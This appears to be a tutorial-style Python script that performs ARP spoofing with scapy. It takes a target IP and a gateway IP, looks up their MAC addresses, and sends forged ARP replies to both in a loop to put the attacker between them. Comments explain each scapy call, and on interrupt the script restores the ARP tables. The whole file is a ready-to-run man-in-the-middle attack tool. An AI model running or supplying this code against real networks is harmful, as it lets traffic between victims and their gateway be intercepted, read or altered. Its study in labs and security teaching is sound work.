import scapy.all as scapy
import time
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_ip", help = "IP Address of the target.")
    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "IP Address of the Gateway.")
    options = parser.parse_args()
    if not options.target_ip:
        #Handling the code if an IP Address of the target is not specified.
        parser.error("[-] Please specify an IP Address of the target machine, use --help for more info.")
    elif not options.gateway_ip:
        #Handling the code if an IP Address of the gateway is not specified.
        parser.error("[-] Please specify an IP Address of the gateway, use --help for more info.")
    return options

def get_mac(ip):
    # scapy.arping(ip)

    '''
    Creating a ARP Packet using Scapy's ARP() class
    object.pdst = ARP() class uses this as a member variable for IP Address of a/the Destination/s.
    object.summary() = shows the member variables of the class
    object.show() = shows the details of the object
    '''
    arp_req_frame = scapy.ARP(pdst = ip)
    # arp_req_frame.show()

    '''
    Creating an Ethernet frame so that we can incorporate Source and Destination MAC Address
    object = Scapy.Ether() where Ether is the class that enables us to create an Ethernet frame
    object.show() = shows the details of the object
    '''
    broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    # broadcast_ether_frame.show()

    '''
    Now we have to combine both the frames so that we can transmit it using ethernet
    Forward slash (/) in scapy allows us to combine frames
    '''
    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
    # broadcast_ether_arp_req_frame.show()

    '''
    The frame to be send is ready and now we just have to send the frame and capture the responses.
    To send the packets and receive the responses we'll use the scapy.srp(frame , timeout = 1)
    scapy.srp(frame , timeout = 1) sends the frame (specified as an argument) to an IP address , and the timeout argument is
    also important as it tells for how much time to wait for an response. Eg: timeout = 1 means wait for 1 sec for the response and
    if there is no response proceed with other IP addresses.
    scapy.srp() returns the responses captured as two lists out of which the 1st list contains the answered responses from devices on the network and the
    2nd list contains the records of IP Addresses which did not respond.
    verbose = False means the srp method will not print any message of its own in the output
    '''
    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    # spoof_packet.show()
    # print(spoof_packet.summary())
    scapy.send(spoof_packet, verbose = False)

def restore(source_ip, destination_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    restore_packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(restore_packet, count =1, verbose = False)

packets_sent = 0

options = get_args()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent += 2
        print("\r[+] Packets Sent: {}".format(packets_sent), end = "")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables.......")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
